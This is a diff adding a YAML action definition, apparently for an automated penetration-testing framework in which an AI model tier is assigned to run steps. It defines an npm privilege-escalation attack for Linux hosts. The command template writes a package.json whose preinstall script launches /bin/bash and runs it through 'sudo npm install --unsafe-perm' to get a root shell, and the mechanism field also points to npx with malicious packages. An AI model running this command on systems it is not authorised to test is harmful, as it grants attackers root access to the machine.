@@ -1,0 +1,16 @@
+name: npm_privesc
+category: privesc
+description: npm/node privilege escalation
+preconditions:
+  - os==linux
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "echo '{"scripts":{"preinstall":"/bin/bash"}}' > /tmp/pkg/package.json && sudo npm install /tmp/pkg --unsafe-perm"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "If sudo allows npm: preinstall script in package.json runs as root. Also: npm exec, npx with malicious package."
